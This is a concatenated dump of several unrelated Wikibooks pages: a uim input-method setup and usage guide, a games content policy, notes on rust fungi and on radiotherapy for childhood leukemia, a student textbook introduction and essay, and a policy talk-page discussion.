      <text xml:space="preserve">{{essay|WB:SPA}}

A '''single-purpose account''' is one that appears to be created for a single purpose — usually to participate in a [[WB:RFD]] or to add to a pivotal discussion. While Wikibookians generally encourage anonymous users to participate, add content, register, and become regular users, users that create a &quot;single-purpose account&quot; to merely &quot;stack the votes&quot; or add weight to discussions are discouraged to do so and may be discounted when judging if there such a discussion has created a [[Wikibooks:Decision making|consensus]].

Wikibookians, however, are encouraged to [[Wikibooks:Assume good faith|assume the good faith]] of new user's intentions — even if the user's first and only contribution is to a particular discussion. As such, this module outlines a contradiction that is a direct result of attempts to judge consensus. Arguably, unless single-purpose accounts are outrightly banned from participating in discussion, there is little actionable guideline that can be created in regards to single-purpose accounts. Instead, when attempting to judge if consensus has been created in a particular discussion, the possibility that single-purpose accounts were active should be — just as other factors should be — taken into account.</text>

{{:uim/Navigation}}
: ''See the [[Uim/Setup#Select a default input method|Setup]] page for instructions on setting the default conversion engine.''

''Uim'' follows accepted standards in keyboard command settings so if you have previously used and input method, ''uim'' should have a similar feel. To turn it on, just hit '''&lt;code&gt;&amp;lt;shift&amp;gt;&amp;lt;space&amp;gt;&lt;/code&gt;''' and, assuming that you've [[Uim/Setup#Select a default input method|set up a default one]], you can start typing in your favorite language.

The default keyboard commands can be also [[Uim/Configuration|configured]] to fit your preferences.

{{:uim/todo|Quick comparison with other IMs on various platforms. Do the default settings emulate other IMs that users may have used in the past? It would be cool to put up a few ~/.uim files that would emulate other IMs (and perhaps offer a few that power-uses find handy). -- actually, that should rather go on the [[Uim/Configuration]] page when that is ready.}}

== Entering text ==

When you turn the default ''[[Uim/Glossary#Input Method|input method]]'' on, you start writing into the ''[[Uim/Glossary#Pre-edit|pre-edit]]''. Some conversion engines will ''[[Uim/Glossary#Commit|commit]]'' the text as you type (e.g. Hangul) while others will display it untill you begin interactive conversion which is needed for languages such as Chinese and Japanese which have many homophones (different words that sound the same).

Interactive conversion is started by hitting the space bar. The conversion engine will break the preedit up into ''[[Uim/Glossary#Segment|segments]]'' and display ''[[Uim/Glossary#Candidate|candidates]]'' for each one. You can choose between the candidates by running through the list using the &lt;code&gt;&amp;lt;up&amp;gt;&lt;/code&gt; or &lt;code&gt;&amp;lt;down&amp;gt;&lt;/code&gt; keys, or by entering the number displayed next to the candidate. The &lt;code&gt;&amp;lt;left&amp;gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;right&amp;gt;&lt;/code&gt; keys allow you to go between segments.

Once you have chosen among the candidates for each segment, you can commit the preedit by hitting the &lt;code&gt;&amp;lt;return&amp;gt;&lt;/code&gt; key (&lt;code&gt;&amp;lt;Enter&amp;gt;&lt;/code&gt;).

{{:uim/note|All the keyboard commands mentioned here may of course be configured to your liking.}}

== Keyboard commands ==

Pretty much everything regarding ''uim'' can be controlled using keyboard commands.

{{:uim/todo|Expand on this and link to a list of configuration variables.}}

== Toolbars ==

:''Please refer to the [[Uim/Setup#Toolbars|toolbar setup]] section for information on how to set up your toolbar.''

The toolbar may display a number of buttons. These show the state of the input method and which modes the conversion engine supports. When ''uim'' is off, this will only be the ''uim'' logo.

When ''uim'' has been started, the button furthest to the left will be the conversion engine selector and it will display the presently active conversion engine. Press it get a list of available conversion engines.

{{:uim/note|Installing the conversion engines isn't enough to make them available. You will have to choose the available ones in the preference tool.

Note also that this is a feature, not a bug, which allows a system to have a large number of conversion engines installed for users with different needs, without unnecessary cluttering of your interface.}}

== Conversion modes ==

Each conversion engine can run in various modes that can be changed on the fly. Below you will find an overview of these. Please see the conversion engine pages for documentation.

Simple conversion rules require only an on/off switch. Conversion engines serving more complex character sets and languages will probably offer further settings. Through these a user may, for example, choose the character set used for input, or a different keyboard layout.

The conversion modes are displayed and easily controlled through the toolbar.

== User dictionaries ==

There is a dictionary tool that can create user customized dictionaries (at least) for Anthy.

{{:Uim/Navigation}}

''Uim'' comes packaged with most *nix distributions, but may also be compiled directly from source.

During installation, you may also want to install some ''[[Uim/Glossary#Input method|input methods]]'' as well. See the [[Uim/Introduction#Current conversion engine implementations|Introduction]] page for a list of currently implemented conversion engines.

&lt;!--
== Debian and Ubuntu ==

 TODO: Check that this is up-to-date.

Uim is included in the official apt repository. On Debian, uim is distributed in several packages, so you can install only the conversion engine(s) that you'll use. To search for uim packages, run the command:
 &lt;code&gt;$ apt-cache search uim&lt;/code&gt;
Then, install the packages. This example installs gtk2.0, xim, and fep modules. 
 &lt;code&gt;$ apt-get install uim uim-utils uim-gtk2.0 uim-xim uim-fep&lt;/code&gt;

== Fedora Core ==

 TODO: Check that this is up-to-date.

Uim is included in the [http://fedoraproject.org/wiki/Extras Fedora Extras] in Fedora Core 4. To install, run 
 &lt;code&gt;$ yum install 'uim*'&lt;/code&gt;
 TODO: ISN'T THIS A LITTLE OVERBOARD FOR THOSE THAT ONLY WANT A SINGLE LANGUAGE

== Gentoo ==

[http://www.gentoo-portage.com/app-i18n/uim An ebuild] is provided by Portage. Some of the conversion engines can be set by defining their corresponding USE flags.

You can view the available USE flags and their settings by using the -v flag on emerge;
 &lt;code&gt;# emerge -pv uim&lt;/code&gt;
or, if you have &lt;code&gt;equery&lt;/code&gt; on your machine, run
 &lt;code&gt;$ equery uses uim&lt;/code&gt;
This will give some further descriptions of each flag.

With the conversion engines set with USE flags, run
 &lt;code&gt;$ emerge uim&lt;/code&gt;
and portage will take care of everything.

== Mandriva ==

 TODO: Check that this is up-to-date.

The official RPM is available at [http://rpmseek.com/rpm-pl/uim.html?hl=de&amp;amp;cs=uim%3APN%3A0%3A0%3A1%3A0%3A0&amp;amp;qArStr=0&amp;amp;qRtStr=1&amp;amp;qDnStr=12 here].
 TODO: WHAT ABOUT THE CONVERSION ENGINES?

== Slackware ==

 TODO: Check that this is up-to-date.

Starting from Slackware 10.2, [http://sourceforge.jp/projects/sap/ the Slackware Add-on package Project] distributes a uim package.
 TODO: WHAT ABOUT THE CONVERSION ENGINES?

== Vine Linux ==

 TODO: Check that this is up-to-date.

Uim is included in Vine Plus. 
 &lt;code&gt;$ apt-get install anthy uim&lt;/code&gt;
and you need to run setime command. 
 &lt;code&gt;$ setime anthy&lt;/code&gt;
Then, relogin to your system.

=== Retrieve the source code ===

You can download the source code from the [http://code.google.com/p/uim/downloads/list source directory]. It includes the core library, various conversion engines, GTK+ bridge, Qt bridge, XIM bridge, FEP bridge, Emacs bridge, tools for configuration, and other tools.

If you want to use the latest development version, see also [[uim/Development]].

=== Extract and configure ===

Begin by extracting the source from tar ball:
  $ tar xvjf uim-x.x.x.tar.bz2
Then, move to the extracted directory and run configure. 
  $ cd uim-x.x.x
  $ ./configure

The following configuration options are disabled by default but can be added to the &lt;code&gt;make&lt;/code&gt; command.
{|
| &lt;code&gt;--enable-debug&lt;/code&gt;
| Build uim with debug information 
|-
| &lt;code&gt;--enable-default-toolkit&lt;/code&gt;
| Set a default toolkit
|-
| &lt;code&gt;--enable-dict&lt;/code&gt;
| Enable Japanese dictionary tool 
|-
| &lt;code&gt;--with-anthy-utf8&lt;/code&gt;
| Use Anthy with UTF-8
|-
| &lt;code&gt;--with-canna&lt;/code&gt;
| Use Canna 
|-
| &lt;code&gt;--with-eb&lt;/code&gt;
| Use EB
|-
| &lt;code&gt;--with-qt&lt;/code&gt;
| Build Qt 3 tools 
|-
| &lt;code&gt;--with-qt-immodule&lt;/code&gt;
| Build Qt 3 immodule. If you have Qt 3, you need the the qt-immodule patch.
|-
| &lt;code&gt;--with-qt4&lt;/code&gt;
| Build Qt 4 tools (&gt;= uim 1.5.7, experimental) 
|-
| &lt;code&gt;--with-qt4-immodule&lt;/code&gt;
| Build Qt 4 immodule (experimental)
|-
| &lt;code&gt;--with-sj3&lt;/code&gt;
| Use Sj3
|-
| &lt;code&gt;--with-wnn&lt;/code&gt;
| Use Wnn
|}

The full set of configuration options, run
  $ ./configure --help

Finally, you make and install the package:
  $ make [configuration options]
  $ sudo make install

{{:uim/note|If required packages for an option are missing, the option will be disabled without errors.}}

By default, uim is installed under &lt;code&gt;/usr/local/&lt;/code&gt;, but it may not be in the system search path. If not, you need to add the line &lt;code&gt;/usr/local/lib&lt;/code&gt; to &lt;code&gt;/etc/ld.conf&lt;/code&gt; and then run &lt;code&gt;ldconfig&lt;/code&gt;. 

&lt;code&gt;libuim&lt;/code&gt; is in &lt;code&gt;/usr/local/lib/&lt;/code&gt;. The scheme programs are in &lt;code&gt;/usr/local/share/uim/&lt;/code&gt;.

{{:uim/todo|On Gentoo, that file doesn't exist. &lt;code&gt;/etc/ld.so.conf&lt;/code&gt; is generatd automatically from &lt;code&gt;/etc/env.d/*&lt;/code&gt;.}}

=== Post-installation ===

To use the GTK+ immodule, you may need to generate the immodule file.&lt;ref&gt;[http://code.google.com/p/uim/wiki/UIMSystemConfiguration System Configuration for uim]&lt;/ref&gt; Run:
  $ sudo gtk-query-immodules-2.0 &gt; /etc/gtk-2.0/gtk.immodules
or 
  $ gtk-query-immodules-2.0 im-uim.so &gt; ~/.immodules

Books relating to some games are encouraged on Wikibooks, while others are not.

==Sports==
Books about sports (including the rules, strategies, etc.) are encouraged, and should be written in a style which would be suitable for use in a Physical Education class. 

==Card Games, Board Games, etc.==
Books about card games and board games are encouraged, so long as the games have some social or historical signifigance. Rulebooks and guides to newly created or released games and very obscure games are in many cases inappropriate.

==Young Children's Games==
Books about educational and social-skills building games for young children are encouraged.

==Video Games and Role Playing Games==
Books about individual video games (VGs) and role playing games (RPGs) are not considered appropriate content for Wikibooks. In the past, these books were permitted and even encouraged, but have fallen out of favor for two important reasons:

1. VGs and RPGs are not in any strict sense academic in nature, and with few exceptions are not played professionally. 

2. VG and RPG books generally address copyrighted works, and tend to go over the reasonable limits of fair use in regards to images.

Books about Video Games or RPGs ''in general'' (as opposed to books about any particular VG or RPG) are perfectly acceptable, due to their cultural and sociological significance in society at large. Books about programming video games are of course encouraged as well.

The change in policy came about after comments from Jimbo Wales, the founder of the Wikimedia Foundation of which Wikibooks is a part. The Wikibookians who had been involved in writing these books before the policy change created a new wiki, [[StrategyWiki:Main_Page|StrategyWiki]], as a place to move the books to. Users interested in writing books on this subject are encouraged to write there.

'''Rusts''' are a group of plant pathogenic fungi which both cause aesthetic damage and inhibit healthy plant growth. Individual rust fungi have very limited host ranges, but often alternate between two hosts as part of their life cycle.

==Symptoms and Signs==
Rusts are primarily foliar diseases, and the most obvious sign is the presence of the fruiting bodies on the leaves, which are brown or orange (&quot;rust colored&quot;). Further symptoms include yellowing and dying leaves, and overall weakness of infected plants.

==Life Cycle==

'''Rusts''' are fungi of the order '''Uredinales'''. Many of these species are plant parasites. Some are superficially similar to the smuts, although their relation to each other is not clear. The taxonomy of Urediniomycota, as a whole, is in a state of flux. 

Many of the rusts have two or more hosts (referred to as ''heteroecious'') and up to five spore stages. However they most commonly reproduce via asexual spore production. Their spores are airborne and can travel great distances. They mostly cause foliar infections. 

The group received its common name from the fact that some species have a reddish spore stage, which resembles the corrosion process known as rust.

==Infection Process==

Rust occurs on many species of plant, but in most causes any one species of rust can only infect one species of plant. The following describes the infection process of asexual spores. 

===Spore Attachment===

When a rust conidia spore lands on a plant surface it needs to attach to it, or it would simply be washed off. First, weak, hydrophobic interactions are formed between the spore and the cutin of the plant cell surface. Then unknown signals cause the production of hydrophobic mucilaginous macromolecules called adhesins. These will stick the spore irreversibly to the plant surface.&lt;ref&gt;Osherov, N. and G.S. May, The molecular mechanisms of conidial germination. FEMS Microbiol. Lett, 2001. 199(2): p. 153–160.&lt;/ref&gt; Once attached, the spore will germinate.

===Germ Tube Elongation===

Rust fungi penetrate the plant by using the natural opening of the stomata, but first the growing germ tube must locate it. Rust fungi have evolved to more efficiently locate stomata by the use of thigmotropism. The germ tube grows in a random manor until it reaches a ridge between [[epidermal cell]]s. At this point it will start to grow perpendicular to the ridge, greatly increasing it's chances of locating a stomata.&lt;ref&gt;Dickinson, M. Molecular Plant Pathology. 2003.&lt;/ref&gt;

===Appresorium Formation===

The stomata is the site of appresorium formation, a structure that functions to both firmly anchor the fungus and aid in penetration.&lt;ref&gt;Deising, H.B., S. Werner, and M. Wernitz, The role of fungal appressoria in plant infection. Microbes Infect, 2000. 2(13): p. 1631-41.&lt;/ref&gt; In the rust fungi appresorial formation is controlled by a process of thigmodifferentiation. Appresoria are formed when the germ tube detects ridges that match the dimensions of the stomatal lips of its host species. 

It has been proposed that this process is mediated by a mechanosensitive calcium ion channel that is located at the germ tube tip. This ion channel would transduce the stretching of the cell membrane caused by changes in leaf topography into ion fluxes that lead to changes in gene expression and appresorium formation.&lt;ref&gt;Zhou, X.L., et al., A mechanosensitive channel in whole cells and in membrane patches of the fungus Uromyces. Science, 1991. 253(5026): p. 1415.&lt;/ref&gt;. This theory is supported by experiments that show that applying Ca&lt;sup&gt;2+&lt;/sup&gt; externally to the germ tube causes differentiation.

From the appresoria an infection peg growns down into the plant and between the mesophyll cells.

===The Haustoria===

Rust fungi are biotrophs, meaning they gain their nutrients from living cells. This requires a specialised entension of the fungi into a living plant cell called a haustoria. This develops from a haustorial mother cell. The plant cell membrane invaginates around the main haustorial body and the space between the two membranes becomes known as the extra-haustorial matrix. An iron and phosphorous rich neck band bridges the plant and fungal membranes and acts as a seal preventing the escape of nutrients into the plant apoplast. The haustoria contains amino acid and hexose sugar transporters and H&lt;sup&gt;+&lt;/sup&gt;-ATPases for the active transport of nutrients from the plant cell.&lt;ref&gt;Voegele, R.T. and K. Mendgen, Rust haustoria: nutrient uptake and beyond. New Phytologist, 2003. 159(1): p. 93-100.&lt;/ref&gt;

The rust fungi will then continue to grow and invade the plant until it is ready for sporulation.

Rust occurs on many species of plant, but in most cases any one species of rust can only infect one species of plant. The following describes the infection process of asexual spores. 

;Spore Attachment:
When a rust spore lands on a plant surface it needs to attach to it, or it would simply be washed off. First, weak, hydrophobic interactions are formed between the spore and the plant cell surface. Then unknown signals cause the production of a substance called ''adhesin''. This will stick the spore irreversibly to the plant surface. Once attached, the spore will germinate.

;Germ Tube Elongation:
Rust fungi penetrate the plant by using the natural pores on the underside of a leaf, but first the growing germ tube must locate it. The germ tube grows in a random manner until it reaches a ridge. At this point it will start to grow perpendicular to the ridge, greatly increasing its chances of locating a pore (called a ''stomata'').

;Appresorium Formation:
The stomata is the site of a structure called an ''appresorium'' that functions to both firmly anchor the fungus and aid in penetration.  From the appresorium an infection peg grows down into the plant and between the leaf cells.

;The Haustoria:
Rust fungi gain their nutrients from living cells. This requires a specialized penetration of the fungi into a living plant cell called a ''haustoria''. This develops from a haustorial mother cell. The plant cell membrane surrounds the main haustorial body. An iron- and phosphorus-rich neck band bridges the plant and fungal membranes and acts as a seal preventing the escape of nutrients into the plant.  The rust fungi will then continue to grow and invade the plant until it is ready to make new spores.

==CNS prophylaxis==
Indications:
*Overt CNS involvement at time of diagnosis
*High risk disease
**&lt;1 yo, &gt;10 yo
**WBC &gt; 50,000
**T-cell ALL 
**Philadelphia chromosome (bcr-abl translocation)


*PCI for CNS prophylaxis as frontline treatment for patients with ALL led to an increase in survival in the 1960s. 
*However, toxicity from PCI is significant, particularly with early trials using 24 Gy
*Dose can be reduced to 12-18 Gy or eliminated entirely if appropriate systemic and intrathecal chemotherapy is used, with lower toxicity
*DFCI Consortium protocol: cranial RT 12 Gy indications (per PMID 17971588): T-cell phenotype, CNS-3 status at diagnosis, or residual disease after induction
*COG AALL0232 protocol (High risk B-precursor ALL)
**Prophylactic 12 Gy cranial RT
***Slow early responders (day 15 BMBx shows M2/M3 disease, or day 29 BMBx shows MRD)
***MLL rearrangement
***Patients pre-treated with steroids (e.g. for bronchiolitis symptoms)
**Therapeutic 18 Gy cranial RT
***CNS 3 disease
**Therapeutic 24 Gy testicular RT
***Initial testicular involvement, and continued evidence of testicular involvement at the end of Induction
*Dose overview:
**Standard risk, CNS 1-2: chemotherapy
**Standard risk, CNS 3: WBRT 18 Gy
**High risk, CNS 1-2: WBRT 12 Gy
**High risk, CNS 3: WBRT 18 Gy
**Overt disease (CN palsy or by MRI): WBRT 24 Gy first, then chemo

'''''Treatments:'''''
&lt;br&gt;CCG trials from 1971-78 used cranial RT + intrathecal MTX but no spinal RT. 
&lt;br&gt;CSI was found to be more effective than cranial RT in treating pts with CNS relapse. (Willougby, MRC, PMID 816410, 1976)
&lt;br&gt;CCG trials from 1978-83 used 24 Gy cranial + 12 Gy spinal given during consolidation phase along with systemic and intrathecal chemo.
:CNS disease at diagnosis was not an independent prognostic factor, thereby indicating the effectiveness of CNS treatment regimens used.  
CCG trials from 1983-89 used more intensive chemotherapy. Reduced spinal dose to 6 Gy in those treated with intensive consolidation phase in order to limit hematopoietic toxicity.

*'''Children's Cancer Group, CCG''', 1996 (1983-89) - PMID 8823255 &amp;mdash; &quot;Craniospinal irradiation for acute lymphoblastic leukemia with central nervous system disease at diagnosis: a report from the Children's Cancer Group.&quot; Chewlow JM et al. Int J Radiat Oncol Biol Phys. 1996 Aug 1;36(1):19-27.
**Prospective. 53 pts with CNS disease on 4 trials for children &gt; 1 yr -- '''CCG-104'''(low-risk), '''CCG-105''' (int-risk), '''CCG-106''' (high-risk), '''CCG-123''' (lymphomatous presentation). Pts with CNS disease received CSI and intrathecal chemo. Pts with CNS disease treated with intensive consolidation chemo received 24 Gy cranial RT + 6 Gy spinal (each at 2 Gy/fx). Pts not treated with intensive consolidation received 24 Gy / 12 Gy. All received intrathecal MTX and/or Ara-C. 
***Median f/u 74 mo. 5-yr EFS for all CNS+ pts was 69%, compared to 67% for those who were CNS-. 5-yr freedom from isolated CNS relapse was 90% vs 94%. No difference between 6 Gy and 12 Gy group.
**Conclusion: CNS disease at diagnosis is not a poor prognostic factor for children treated with intensive chemo + craniospinal RT + intrathecal chemo.  6 Gy of spinal RT + 24 Gy cranial RT is appropriate.

**Individual data on 2848 patients randomly assigned to CNS-directed therapy prior 1993
**10-year EFS: RT + IT-chemo 64% vs. high-dose IT-chemo 63% (NS)
**Conclusion: &quot;Radiotherapy can be replaced by long-term intrathecal therapy. Intravenous methotrexate gives some additional benefit by reducing non-CNS relapses.&quot;

==RT Toxicity==
*'''DFCI Consortium Trial 95-01'''
**Randomized. ''See above for full protocol information''. Subset 164 patients with standard-risk ALL treated with Arm 1) 18 Gy CRT + double IT chemo vs. Arm 2) triple IT chemo
**'''2007''' PMID 17971588 -- &quot;Neuropsychological outcomes from a randomized trial of triple intrathecal chemotherapy compared with 18 Gy cranial radiation as CNS treatment in acute lymphoblastic leukemia: findings from Dana-Farber Cancer Institute ALL Consortium Protocol 95-01.&quot; (Waber DP, J Clin Oncol. 2007 Nov 1;25(31):4914-21.). Neuropsychological testing at median 6 years
**Outcome: cognitive function for both groups in average range (median IQ ~100), prevalence of children in special ed comparable. Significant difference in speed of information processing
**Conclusion: minimal difference between cranial RT and intrathecal chemo alone. Preferable to avoid CRT, but if necessary, CRT 18 Gy may not add risk for neurotoxicity

*'''Toronto, 2006''' PMID 16921038 -- &quot;Comparison of long-term neurocognitive outcomes in young children with acute lymphoblastic leukemia treated with cranial radiation or high-dose or very high-dose intravenous methotrexate.&quot; (Spiegler BJ, J Clin Oncol. 2006 Aug 20;24(24):3858-64.)
**Retrospective review. 79 patients with high-risk ALL treated on protocols. CNS prophylaxis either CRT 18 Gy, or high-dose MTX, or very-high dose MTX. Neurocognitive assessment done in mean 10.5 years after Dx (5-20 years)
**Outcome: no difference between either MTX dose and population mean; CRT did ~1 STD worse (clinically significant, since many require special academic accommodations)
**Conclusion: &quot;Treatment strategies for young children with ALL that avoid CRT are associated with good long-term neurocognitive outcomes.&quot;

*'''St. Jude's, 2003''' (1962-1992) PMID 12917300 -- &quot;Extended follow-up of long-term survivors of childhood acute lymphoblastic leukemia.&quot; (Pui CH, N Engl J Med. 2003 Aug 14;349(7):640-9.)
**Retrospective. 856 patients with no recurrence treated on 13 consecutive clinical trials (out of 2069 treated). Min F/U 10 years
**2nd neoplasms: 41/44 RT-related (cumulative risk at 20 years RT 21% vs. no RT 1%)
**Death rate: standardized mortality ratio to US population - RT 1.9 (SS) vs. no RT 1.7 (NS)
**Unemployment: men RT 15% vs. no RT 5%; women RT 35% vs. no RT 5%
**Conclusion: children with ALL who did not receive RT can expect normal life; RT is associated with risk of second neoplasms, slight excess mortality, and unemployment

*'''NCI, 1994''' PMID 7933424 -- &quot;Educational attainment in long-term survivors of childhood acute lymphoblastic leukemia.&quot; (Haupt R, JAMA. 1994 Nov 9;272(18):1427-32.)
**Retrospective. 593 adult survivors of ALL, 409 sibling controls treated in 23 CCG centers
**More likely to enter special education, RR 3.4 (SS) or learning disability, RR 3.6 (SS). Risk increased with increasing dose of cranial RT
**Same probability of finishing high school, or earning bachelor's degree
**CNS RT 24 Gy or age &lt;6: less likely to enter college (RR 0.67)
**Conclusion: &quot;This large study demonstrates that childhood acute lymphoblastic leukemia survivors have a greater likelihood of being placed in special education or learning disabled programs than their siblings, but that most are able to overcome these problems. Dose of cranial radiotherapy and age at diagnosis are the most important education-related risk factors.&quot;

      <text xml:space="preserve">This is the first edition of a textbook created and edited as part of an education course, ESSE 474/574, at Old Dominion University in Norfolk, VA. The book's primary contributors have been graduate and undergraduate, preservice and present teachers. 

Our goals for this project are manifold, but we would like to take a minute to highlight some of those that we consider most important. First, we want to prove that a student-authored textbook can be of a quality equal to that of a traditional textbook. After all, it seems counter-intuitive to imagine that students could learn from a textbook that is too sophisticated for them to have written themselves. Furthermore, this text should serve as proof that, due to the vast availability of information via the Internet, traditional textbooks written by intellectual elites are no longer necessary to the same degree they were before the Information Age. Next, the process of creating this text will serve to empower preservice teachers with knowledge of technology and other skills such as effective communication and self-/peer-editing that will serve them well when they enter the classroom later, as teachers.

If you have stumbled onto this book by mistake, we encourage you to take a few minutes and read a chapter or two. After reading, feel free to click the blue rating buttons at the bottom of each page. This will help us identify the highest- and lowest-quality sections.

Each section of each chapter of this book was researched and developed by three students individually; thus, there are three articles that correspond to each section of each chapter. The students rated their peers articles to determine which was most useful. Those articles voted most useful can be found in each chapter's main page. Those articles which were not selected as most useful contain some very good information, and you may find them in the sections labeled &quot;Supplemental Materials.&quot;

      <text xml:space="preserve">==The Achievement Gap==
Jocelyn Dudley
Old Dominion University

The achievement gap between black and white students is a key measure of our country's failure to achieve true equality. The gap between the achievement of black students and that of white students is one of the most intense problems affecting education today. The achievement gap is a phenomenon that has been widely ignored for a long time. There is a limited amount of research concerning this topic. It is believed that the reason for this lack of knowledge and awareness is due to the fact that the achievement gap is looked at as a problem with no solution. The reason society feels that the achievement gap cannot be solved is because they feel that poverty and race do not cause the achievement gap. This however is not true, after all, it is clear that there is nothing intrinsic about &quot;blackness&quot; or &quot;whiteness&quot; that can be the cause of the gap. There are no genetic or other immutable traits that could conceivably be the cause of the gap. Thus the problem is manifestly one that can and should be solved. There is tons of research on the differences between race and poor and middle class students, yet it presents its self as a surprise when these differences show themselves in school achievement. Because of this denial, the educational system continues to move around the achievement gap and continues to address a variety of other concerns that ultimately lead them back to the same place, the achievement gap. 

When addressing the issue of the achievement gap, it is imperative to look at the causal factors. What is causing the success rate to be so significantly different among students of different races and socioeconomic backgrounds? Current research has chosen to address four main areas of concern. All of these gaps working together to create the achievement gap in school. The first and perhaps the most important difference is the reading gap. The fact of the 
matter is that, children of educated parents read to their children more than parents with no education. Children of educated parents are also encouraged to read to themselves and read for fun more often than children of parents with no education. Also, white children are more likely to be read to then black children. Reading is such an important part in preparation for school and all aspects of school, that these facts alone shows us why there is such differences in the achievement  of back students v. white students and students with parents who are educated v. parents who did not receive an adequate education. The second gap is the conversation gap. Conversation helps vocabulary and communication which is extremely important in school and ultimately in life. Without proper communication skills students will miss out on valuable opportunities in school and in the work force. So students with improper communication skills are ultimately at a disadvantage in life. The difference in conversation is also different in homes of educated parents and middle class parents. These parents are more likely to engage in more conversation with their children and at a much earlier age. They often participate in pretend conversations with their children. Not only is it important to talk with your children more, but its important to participate in meaningful conversation. For example, educated and middle class parents give indirect instructions and give their children choices, where non-educated parent’s conversation is very direct. These factors are so important because research has shown that the achievement continues to affect students after school. Research showed that there were significant trends in racial and ethnic achievement gap in SAT scores. 

The role model gap is also a factor to look at when addressing the achievement gap in school. Student who are exposed to more positive role models are more likely to be successful. 

Middle class parent are more likely to associate with other middle class professionals, exposing them to their children. These role models act as resources to children. Whereas a child whose parents are living in poverty is less likely to associate with professional, therefore their children have less role models. Role models are important to children because they give them hope and expose them to different jobs. Last but certainty not least is the health and housing gap. This gap doesn’t appear that it would have an affect on school, however that is the total opposite. The social and economic conditions of children highly influence their success in school. Lower income children have poorer health, which make them less physically and mentally ready to go into the classroom and be ready to learn. Also due to lack of money and resources poor children are more likely to miss school because of medical reasons.

In conclusion, the achievement gap has been proven to be one of, if not the most important educational challenge at this time. As a nation if we cannot successfully equally educate our children than we have without a doubt failed. Yes it is true that the achievement gap starts at home and is controlled by such things that teachers are believed to have no control over. However, how can we even begin to try to address this issue if we don’t even believe that it exists? The first step is to get out of denial, just as race and class play a huge role in the job market and society as a whole, we have to open our minds and recognize that it is present in our schools. Everyone in the school system has to bring this issue to the forefront in America and let this country know these are the changes that need to be made for our children. No politicians or organization is going to address this issue, teachers, administrators and even students have to fight for the future. We must begin to ask these questions, How can we not only stress the importance of parents reading to their children, but how do we show a mother with no education and two jobs how to take time to set with their child and read? How do we make sure that our students do not come to class hungry? The education system cannot solve these problems; however they can begin to put the pressure on those who can. Lastly, this solution will take a lot more research, one goal should be to define the problem more clearly and develop research-based classrooms.

==Essay Question==

What can parents and teacher do to help narrow the achievement gap?

Reading is the most important component of education. Parents and teachers should make time to read to children and much as possible. At home parents should try to set a side a special time each day to read to their children and then let their children read to them. However, it is not enough to just read, parents should engage in meaningful conversations about the books by asking questions. In the classroom, teachers should also read to their students as well as letting the students read out loud. Parents and teachers should make it a priority to provide children with lots and lots of  books of different varieties. The books should be easily accessible. Children should also be encouraged to read on their own for fun. Reading is not just for school, but it can be a form of entertainment, children should be encouraged to use their imagination. Last but least, both parents and teachers have to start by being role models first. They can do this by showing children that reading is fun by letting them see them reading all the time.

      <text xml:space="preserve">I'm for this policy, but I'm afraid that &quot;Young Children's Games&quot; section leaves a backdoor for books about completely new board games. --[[User:Derbeth|Derbeth]] [[User talk:Derbeth|&lt;sup&gt;talk&lt;/sup&gt;]] 18:20, 11 March 2007 (UTC)

:Yeah, I had started writing specifically about VGs and RPGs, but then started to think about other kinds of games too. For example, we recently deleted a book stub on &quot;[[Beer pong]]&quot;, and I can imagine new books on the latest Parker Bros&lt;sup&gt;TM&lt;/sup&gt; games appearing as well. The young childrens games I had in mind were more of the &quot;duck, duck, goose!&quot; variety... perhaps a single book about such games would be appropriate for teachers and parents, since young children sometimes like to reinvent the rules so that they always &quot;win&quot; ;-). We've really got very little content here on early childhood education, but since most of the games and activities taught to the very young are passed down through oral tradition, this might be a great project for us! --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 18:43, 11 March 2007 (UTC)

== Removing comments about Jimbo ==

Well, first of all, he is no longer the chairman of the Wikimedia Foundation.  Indeed, I havn't even really seen him get involved with much of anything related to Wikimedia projects, except in the case of the fiasco with [[w:User:Essjay]], and that had a direct tie with what Jimbo has been doing lately with Wikia.

In addition, Jimbo's comments were very divisive, and incomplete as well.  I'm not going to turn this into a critical comment about Jimbo here, but it is very much his style to stir up the pot a little bit, suggest there might be a problem, and then be vague about the possible solution.  The video game books are but one example of this.  In addition, if you look at [[w:User:Jimbo Wales]] and look at '''&quot;You can edit this page right now&quot;''', he openly encourages people to challenge what is currently policy and that you should be able to propose significant changes.

On the other hand, even Jimbo acknowledged that '''&quot;Any changes to the software must be gradual and reversible.&quot;'''  This includes project policies.  One of the huge complaints I had about what happened with the video game books was that the changes were of a very permanent nature.

Most importantly, I would hope that in terms of official policies that we here on Wikibooks can think for ourselves.  Even if at the time Jimbo wanted to encourage a critical review about video game books, and questioned their validity as educational content, we shouldn't be treating his words here as holy scripture.  He is a good man, but it is just the opinion of that one individual.  One of the things I like how the Foundation has been going lately is that this &quot;god-king&quot; role is simply not there any more.  Certainly Brad Patrick and Anthere get huge respect, but they aren't quite the same thing here.

Let's just deal with the policy here and keep in this case the historical perspetives in the talk pages.  While there may be strong historical reasons for culling video game books, that doesn't mean it has to be this way.  We certainly can change that policy if there is concensus here to do so.  Or to go in completely different directions.  What really needs to happen is for the Wikibooks community to lay to rest for once and all what happened here, and debate policy on the merits of the ideas, and not because &quot;Jimbo said&quot; something.

Is there anybody realistically saying that Wikibooks will be shut down by the WMF because we are including video game books?  Where was that said?  If admins decide to keep these books, are they going to be desysoped (baring that official policy developed by the community has not banned them yet)?  Let's get rid of this very direct [[Wikibooks:No personal attacks|personal attack]] and instead deal with the ideas about improving the quality of Wikibooks in general... and to answer critcism by reviewers and educators that Wikibooks is nothing more than a bunch of video game cheat books.  --[[User:Robert Horning|Rob Horning]] 20:44, 11 March 2007 (UTC)

:Personal attack? (I really have no idea what you mean.) Whether or not Jimbo is currently the chairman -- and was he still chairman when he made those comments? -- He generally only speaks at the behest of and/or for the benefit of his fellow foundation members. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] | &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 22:00, 11 March 2007 (UTC)

